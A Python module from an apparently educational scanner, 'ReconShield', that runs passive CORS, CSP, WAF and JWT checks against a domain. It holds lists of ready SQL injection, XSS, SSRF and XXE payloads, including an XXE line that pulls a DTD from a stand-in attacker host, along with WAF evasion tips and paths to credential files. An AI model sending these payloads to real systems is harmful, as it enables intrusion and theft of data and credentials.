"""
Simulated Vulnerability Assessment Service — Educational/Research Use Only.

⚠️ IMPORTANT: All checks in this module are PASSIVE or SIMULATED.
- CORS: Real OPTIONS request (passive — we observe headers only, no exploitation)
- CSP Evaluation: Parse existing CSP header (passive analysis)
- WAF Detection: Fingerprint from response headers (passive)
- JWT Analysis: Decode tokens from response (passive observation)
- SQLi/XSS/SSRF/XXE: Indicator detection ONLY — no payloads are sent
- Directory Simulation: Pre-defined wordlist display — no actual brute force

NO active exploitation. NO payload injection. For education and research only.
"""
import httpx
import re
import base64
import json as _json
from utils.logger import logger

# ─── CORS Deep Dive ──────────────────────────────────────────────────────────

CORS_TEST_ORIGINS = [
    "https://evil.com",
    "null",
    f"https://attacker.com",
]

CORS_PAYLOADS_EDUCATIONAL = [
    {
        "name": "Origin Reflection",
        "description": "Server reflects any Origin header back — allows any domain to read responses",
        "example": "Origin: https://attacker.com → Access-Control-Allow-Origin: https://attacker.com",
        "remediation": "Whitelist specific trusted origins. Never reflect arbitrary Origin values.",
    },
    {
        "name": "Null Origin Bypass",
        "description": "Server allows null origin — attackers can use sandboxed iframes",
        "example": 'Origin: null → Access-Control-Allow-Origin: null',
        "remediation": "Never allow null origin in CORS policy. Remove null from allowed origins list.",
    },
    {
        "name": "Wildcard with Credentials",
        "description": "Access-Control-Allow-Origin: * with credentials — browsers block this, but may indicate weak policy",
        "example": "Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
        "remediation": "Cannot combine wildcard origin with credentials. Use specific origin whitelist.",
    },
]


async def _check_cors(domain: str, client: httpx.AsyncClient) -> dict:
    result = {
        "reflects_origin": False,
        "allows_null": False,
        "allows_wildcard": False,
        "allows_credentials": False,
        "issues": [],
        "payloads": CORS_PAYLOADS_EDUCATIONAL,
    }
    try:
        # Test with evil origin
        resp = await client.options(
            f"https://{domain}",
            headers={
                "Origin": "https://evil-attacker-reconshield.com",
                "Access-Control-Request-Method": "GET",
            },
        )
        acao = resp.headers.get("access-control-allow-origin", "")
        acac = resp.headers.get("access-control-allow-credentials", "").lower()

        if "evil-attacker-reconshield.com" in acao:
            result["reflects_origin"] = True
            result["issues"].append(
                "CORS Origin Reflection: Server reflects arbitrary Origin header — "
                "critical CORS misconfiguration"
            )
        if acao == "*":
            result["allows_wildcard"] = True
            result["issues"].append("Wildcard CORS policy (Access-Control-Allow-Origin: *)")
        if acac == "true":
            result["allows_credentials"] = True
            result["issues"].append("CORS allows credentials — session tokens may be exposed cross-origin")

        # Test null origin
        resp2 = await client.options(
            f"https://{domain}",
            headers={"Origin": "null", "Access-Control-Request-Method": "GET"},
        )
        acao2 = resp2.headers.get("access-control-allow-origin", "")
        if acao2 == "null":
            result["allows_null"] = True
            result["issues"].append(
                "Null origin allowed — sandboxed iframe attack possible"
            )
    except Exception as e:
        logger.debug(f"CORS check failed for {domain}: {e}")

    return result


# ─── CSP Evaluator ───────────────────────────────────────────────────────────

CSP_DIRECTIVES_REQUIRED = [
    "default-src", "script-src", "style-src", "img-src",
    "frame-ancestors", "base-uri", "form-action",
]

CSP_RISKY_VALUES = ["'unsafe-inline'", "'unsafe-eval'", "data:", "*"]


def _evaluate_csp(csp_header: str | None) -> dict:
    if not csp_header:
        return {
            "present": False,
            "score": 0,
            "grade": "F",
            "issues": ["Content Security Policy header is missing — XSS attacks unrestricted"],
            "missing_directives": CSP_DIRECTIVES_REQUIRED,
            "unsafe_values": [],
            "bypasses": [
                "No CSP means any injected script executes freely",
                "Session cookie theft via XSS is trivial",
                "Keyloggers can be injected via malicious scripts",
            ],
        }

    directives = {}
    for part in csp_header.split(";"):
        part = part.strip()
        if part:
            tokens = part.split()
            if tokens:
                directives[tokens[0].lower()] = tokens[1:] if len(tokens) > 1 else []

    score = 100
    issues = []
    unsafe_values = []
    bypasses = []
    missing = []

    for directive in CSP_DIRECTIVES_REQUIRED:
        if directive not in directives:
            missing.append(directive)
            score -= 8
            issues.append(f"Missing directive: {directive}")

    for directive, values in directives.items():
        for val in values:
            if val in CSP_RISKY_VALUES:
                unsafe_values.append({"directive": directive, "value": val})
                score -= 10
                if val == "'unsafe-inline'":
                    issues.append(f"'unsafe-inline' in {directive} — CSP bypassable via inline scripts")
                    bypasses.append(f"Inline script injection via {directive}")
                elif val == "'unsafe-eval'":
                    issues.append(f"'unsafe-eval' in {directive} — eval() allowed, enables code injection")

    score = max(0, min(100, score))
    grade = (
        "A+" if score >= 95 else "A" if score >= 85 else "B" if score >= 75 else
        "C" if score >= 60 else "D" if score >= 45 else "F"
    )

    return {
        "present": True,
        "raw": csp_header[:500],
        "directives": list(directives.keys()),
        "score": score,
        "grade": grade,
        "issues": issues,
        "missing_directives": missing,
        "unsafe_values": unsafe_values,
        "bypasses": bypasses,
    }


# ─── WAF Detection ────────────────────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "server_values": ["cloudflare"],
        "cookie_patterns": ["__cfduid", "cf_clearance"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "server_values": ["awselb", "amazons3"],
        "cookie_patterns": ["aws-waf-token"],
    },
    "ModSecurity": {
        "headers": ["x-mod-security", "server-modsecurity"],
        "server_values": ["mod_security"],
        "cookie_patterns": [],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server_values": ["sucuri"],
        "cookie_patterns": [],
    },
    "Imperva / Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "server_values": ["incapsula"],
        "cookie_patterns": ["incap_ses", "visid_incap"],
    },
    "Akamai": {
        "headers": ["akamai-origin-hop", "x-check-cacheable"],
        "server_values": ["akamai"],
        "cookie_patterns": ["aka_"],
    },
    "Fastly": {
        "headers": ["x-served-by", "fastly-restarts"],
        "server_values": ["fastly"],
        "cookie_patterns": [],
    },
}


def _detect_waf(headers: dict, cookies: str = "") -> dict:
    detected = None
    confidence = "Low"
    evidence = []

    h_lower = {k.lower(): v.lower() for k, v in headers.items()}
    server = h_lower.get("server", "")
    cookies_lower = cookies.lower()

    for waf_name, signatures in WAF_SIGNATURES.items():
        matches = 0
        for header in signatures["headers"]:
            if header in h_lower:
                matches += 1
                evidence.append(f"Header: {header}")
        for sv in signatures["server_values"]:
            if sv in server:
                matches += 1
                evidence.append(f"Server: {sv}")
        for cp in signatures["cookie_patterns"]:
            if cp in cookies_lower:
                matches += 1
                evidence.append(f"Cookie: {cp}")

        if matches >= 2:
            detected = waf_name
            confidence = "High"
            break
        elif matches == 1:
            detected = waf_name
            confidence = "Medium"

    return {
        "detected": bool(detected),
        "vendor": detected,
        "confidence": confidence,
        "evidence": evidence,
        "bypass_techniques": [
            "Case variation in payloads (e.g., SeLeCt instead of SELECT)",
            "Unicode encoding of special characters",
            "HTTP parameter pollution",
            "Chunked transfer encoding",
        ] if detected else [],
        "note": (
            f"{detected} WAF detected — additional evasion required for testing"
            if detected else
            "No WAF detected — application may be directly accessible"
        ),
    }


# ─── JWT Analysis ─────────────────────────────────────────────────────────────

def _analyze_jwt(token: str) -> dict:
    """Decode and analyze a JWT token for weaknesses."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        # Decode header
        header_b64 = parts[0] + "==" * (4 - len(parts[0]) % 4)
        header = _json.loads(base64.urlsafe_b64decode(header_b64))

        # Decode payload
        payload_b64 = parts[1] + "==" * (4 - len(parts[1]) % 4)
        payload = _json.loads(base64.urlsafe_b64decode(payload_b64))

        issues = []
        if header.get("alg", "").lower() == "none":
            issues.append("Algorithm 'none' — JWT can be forged without signature (CVE-2015-9235)")
        if header.get("alg", "").upper() == "HS256":
            issues.append("HS256 — Symmetric key; vulnerable to brute force if key is weak")
        if "exp" not in payload:
            issues.append("No expiration (exp) claim — token never expires")
        if "admin" in str(payload).lower() or "role" in str(payload).lower():
            issues.append("Role/admin information in payload — verify server-side authorization")

        sensitive_keys = ["password", "secret", "key", "credit", "ssn", "email"]
        leaked = [k for k in payload if any(s in k.lower() for s in sensitive_keys)]
        if leaked:
            issues.append(f"Sensitive data in payload: {', '.join(leaked)}")

        return {
            "found": True,
            "algorithm": header.get("alg", "unknown"),
            "payload_keys": list(payload.keys()),
            "has_expiry": "exp" in payload,
            "issues": issues,
            "educational_note": (
                "JWTs are base64-encoded (not encrypted) — never store secrets in payload"
            ),
        }
    except Exception:
        return {"found": True, "issues": ["Could not decode JWT — may be encrypted (JWE)"]}


async def _check_jwt(domain: str, client: httpx.AsyncClient) -> dict:
    result = {"tokens_found": [], "issues": [], "found": False}
    try:
        resp = await client.get(f"https://{domain}")
        # Check cookies for JWT
        cookies = resp.headers.get("set-cookie", "")
        auth_header = resp.headers.get("authorization", "")

        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        tokens_found = []

        # Check common locations
        for source, text in [("Cookie", cookies), ("Authorization", auth_header), ("Body", resp.text[:10000])]:
            matches = re.findall(jwt_pattern, text)
            for match in matches[:3]:
                analysis = _analyze_jwt(match)
                if analysis:
                    result["found"] = True
                    tokens_found.append({**analysis, "location": source, "token_preview": match[:50] + "..."})

        result["tokens_found"] = tokens_found
        for token in tokens_found:
            result["issues"].extend(token.get("issues", []))

    except Exception as e:
        logger.debug(f"JWT check failed for {domain}: {e}")
    return result


# ─── SQLi / XSS Indicator Detection (passive) ─────────────────────────────────

SQLI_PAYLOADS_EDUCATIONAL = [
    {"payload": "' OR '1'='1", "type": "Boolean-based blind", "target": "Login forms"},
    {"payload": "' UNION SELECT NULL--", "type": "Union-based", "target": "Query parameters"},
    {"payload": "'; DROP TABLE users--", "type": "Stacked query", "target": "Destructive"},
    {"payload": "1' AND SLEEP(5)--", "type": "Time-based blind", "target": "Query parameters"},
]

XSS_PAYLOADS_EDUCATIONAL = [
    {"payload": "<script>alert(1)</script>", "type": "Reflected XSS", "target": "URL parameters"},
    {"payload": '"><img src=x onerror=alert(1)>', "type": "HTML injection", "target": "Form inputs"},
    {"payload": "javascript:alert(document.cookie)", "type": "DOM XSS", "target": "href attributes"},
    {"payload": "<svg onload=alert(1)>", "type": "SVG-based XSS", "target": "Content fields"},
]

SSRF_PAYLOADS_EDUCATIONAL = [
    {"payload": "http://169.254.169.254/latest/meta-data/", "type": "AWS metadata", "target": "URL params"},
    {"payload": "http://localhost/admin", "type": "Internal admin", "target": "URL params"},
    {"payload": "file:///etc/passwd", "type": "File read", "target": "File upload URL params"},
    {"payload": "http://192.168.1.1", "type": "Internal network scan", "target": "URL params"},
]

XXE_PAYLOADS_EDUCATIONAL = [
    {
        "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "type": "File disclosure",
        "target": "XML endpoints",
    },
    {
        "payload": '<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;',
        "type": "OOB exfiltration",
        "target": "XML endpoints",
    },
]

DIR_SIMULATION_WORDLIST = [
    "/admin/", "/login/", "/dashboard/", "/api/", "/swagger/", "/swagger-ui/",
    "/redoc/", "/.git/", "/.env", "/backup.zip", "/config.yml", "/config.json",
    "/wp-admin/", "/phpmyadmin/", "/server-status", "/server-info",
    "/debug/", "/console/", "/actuator/", "/actuator/health", "/actuator/env",
    "/graphql", "/graphiql", "/.aws/credentials", "/s3/", "/uploads/",
    "/files/", "/private/", "/internal/", "/v1/", "/v2/", "/v3/", "/api/v1/",
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/crossdomain.xml",
]


async def _detect_sqli_indicators(domain: str, client: httpx.AsyncClient) -> dict:
    """Passively detect SQLi risk indicators from robots.txt and URL patterns."""
    indicators = []
    try:
        # Fetch main page to detect query parameters in links
        resp = await client.get(f"https://{domain}")
        html = resp.text[:50000]
        # Find URLs with query parameters (potential SQLi targets)
        query_urls = re.findall(r'href=["\']([^"\']*\?[^"\']+)["\']', html)
        if query_urls:
            indicators.append(f"{len(query_urls)} URLs with query parameters detected — potential SQLi targets")
        # Check for common form inputs
        form_count = len(re.findall(r'<form', html, re.IGNORECASE))
        input_count = len(re.findall(r'<input', html, re.IGNORECASE))
        if form_count > 0:
            indicators.append(f"{form_count} form(s) with {input_count} input(s) detected")
    except Exception:
        pass
    return {
        "indicators": indicators,
        "risk": "Medium" if indicators else "Low",
        "payloads": SQLI_PAYLOADS_EDUCATIONAL,
        "remediation": [
            "Use parameterized queries / prepared statements",
            "Implement input validation and sanitization",
            "Apply principle of least privilege for DB users",
            "Enable Web Application Firewall (WAF)",
        ],
        "note": "🔒 SIMULATION MODE — No SQL injection payloads were sent to the target",
    }


async def _detect_xss_indicators(domain: str, client: httpx.AsyncClient) -> dict:
    """Passively detect XSS risk indicators."""
    indicators = []
    try:
        resp = await client.get(f"https://{domain}")
        html = resp.text[:50000]
        form_count = len(re.findall(r'<form', html, re.IGNORECASE))
        text_inputs = len(re.findall(r'<input[^>]+type=["\']text["\']', html, re.IGNORECASE))
        textareas = len(re.findall(r'<textarea', html, re.IGNORECASE))
        search_inputs = len(re.findall(r'<input[^>]+(?:search|query|q)[^>]*>', html, re.IGNORECASE))

        if form_count > 0:
            indicators.append(f"{form_count} form(s) detected — potential XSS entry points")
        if search_inputs > 0:
            indicators.append(f"Search input detected — test for reflected XSS in search results")
        if textareas > 0:
            indicators.append(f"{textareas} textarea(s) — potential stored XSS vectors")

        # Check CSP presence
        csp = resp.headers.get("content-security-policy", "")
        if not csp:
            indicators.append("No CSP header — XSS attacks not mitigated by browser policy")

    except Exception:
        pass
    return {
        "indicators": indicators,
        "risk": "High" if len(indicators) >= 2 else "Medium" if indicators else "Low",
        "payloads": XSS_PAYLOADS_EDUCATIONAL,
        "remediation": [
            "Implement Content Security Policy (CSP) header",
            "Encode all user-controlled output (HTML, JS, URL encoding)",
            "Use DOMPurify for client-side sanitization",
            "Set HttpOnly and SameSite flags on session cookies",
        ],
        "note": "🔒 SIMULATION MODE — No XSS payloads were injected",
    }


def _build_ssrf_check() -> dict:
    return {
        "indicators": [
            "SSRF requires URL parameters that fetch external resources (webhooks, file imports, etc.)",
            "Cloud metadata endpoints are high-value targets",
        ],
        "payloads": SSRF_PAYLOADS_EDUCATIONAL,
        "risk": "Medium",
        "remediation": [
            "Validate and allowlist URLs before fetching",
            "Block requests to internal IP ranges (127.x, 10.x, 192.168.x, 169.254.x)",
            "Use cloud IMDSv2 with session-oriented requests (AWS)",
            "Implement network egress filtering",
        ],
        "note": "🔒 SIMULATION MODE — No SSRF probes were sent",
    }


def _build_xxe_check() -> dict:
    return {
        "indicators": [
            "XXE targets XML-parsing endpoints (file upload, SOAP, RSS/Atom feeds)",
            "Look for endpoints accepting XML content-type",
        ],
        "payloads": XXE_PAYLOADS_EDUCATIONAL,
        "risk": "Medium",
        "remediation": [
            "Disable external entity processing in XML parsers",
            "Use safe XML parsing libraries (defusedxml in Python)",
            "Implement input validation for XML content",
            "Prefer JSON over XML for APIs",
        ],
        "note": "🔒 SIMULATION MODE — No XXE payloads were sent",
    }


def _build_dir_simulation() -> dict:
    return {
        "simulated_paths": DIR_SIMULATION_WORDLIST,
        "high_risk_paths": [p for p in DIR_SIMULATION_WORDLIST if any(
            kw in p for kw in ["admin", ".env", ".git", "backup", "config", "phpmyadmin", "actuator"]
        )],
        "note": "🔒 SIMULATION — Paths shown are common vulnerability targets. No brute force was performed.",
        "remediation": [
            "Block access to .git/, .env, backup files at web server level",
            "Use 404 for all non-existent paths (avoid revealing path existence)",
            "Implement robots.txt restrictions for admin paths",
            "Enable directory listing protection (Options -Indexes in Apache)",
        ],
    }


# ─── Main Entry Point ─────────────────────────────────────────────────────────

async def vuln_simulation(domain: str, existing_headers: dict | None = None) -> dict:
    """
    Run educational vulnerability simulation checks.
    
    ⚠️ All checks are passive or simulated — no actual exploitation.
    """
    result = {
        "cors": {},
        "csp_eval": {},
        "waf": {},
        "jwt": {},
        "sqli": {},
        "xss": {},
        "ssrf": _build_ssrf_check(),
        "xxe": _build_xxe_check(),
        "directory_sim": _build_dir_simulation(),
        "issues": [],
        "risk_level": "Low",
        "disclaimer": (
            "⚠️ SIMULATION MODE — All vulnerability checks are educational simulations. "
            "No payloads were executed against the target. "
            "Real penetration testing requires explicit written authorization."
        ),
    }

    try:
        async with httpx.AsyncClient(
            follow_redirects=True, timeout=12, verify=False,
            headers={"User-Agent": "ReconShield-Educational/1.0"}
        ) as client:
            # Run all passive checks concurrently
            import asyncio
            cors, jwt_check, sqli_check, xss_check = await asyncio.gather(
                _check_cors(domain, client),
                _check_jwt(domain, client),
                _detect_sqli_indicators(domain, client),
                _detect_xss_indicators(domain, client),
                return_exceptions=True,
            )

            if not isinstance(cors, Exception):
                result["cors"] = cors
                result["issues"].extend(cors.get("issues", []))

            if not isinstance(jwt_check, Exception):
                result["jwt"] = jwt_check
                result["issues"].extend(jwt_check.get("issues", []))

            if not isinstance(sqli_check, Exception):
                result["sqli"] = sqli_check

            if not isinstance(xss_check, Exception):
                result["xss"] = xss_check

            # CSP evaluation from existing headers or fresh fetch
            csp_header = None
            if existing_headers:
                for h in existing_headers.get("headers", []):
                    if h.get("key") == "content-security-policy" and h.get("value"):
                        csp_header = h["value"]
                        break
            if not csp_header:
                try:
                    resp = await client.get(f"https://{domain}")
                    csp_header = resp.headers.get("content-security-policy")
                    # WAF detection
                    result["waf"] = _detect_waf(dict(resp.headers), resp.headers.get("set-cookie", ""))
                except Exception:
                    pass

            result["csp_eval"] = _evaluate_csp(csp_header)
            result["issues"].extend(result["csp_eval"].get("issues", [])[:2])

            # Determine overall risk
            if result["cors"].get("reflects_origin") or result["cors"].get("allows_null"):
                result["risk_level"] = "Critical"
            elif result["csp_eval"].get("grade", "F") in ("D", "F") or result["jwt"].get("found"):
                result["risk_level"] = "High"
            elif result["issues"]:
                result["risk_level"] = "Medium"

    except Exception as e:
        logger.error(f"Vuln simulation failed for {domain}: {e}")

    return result
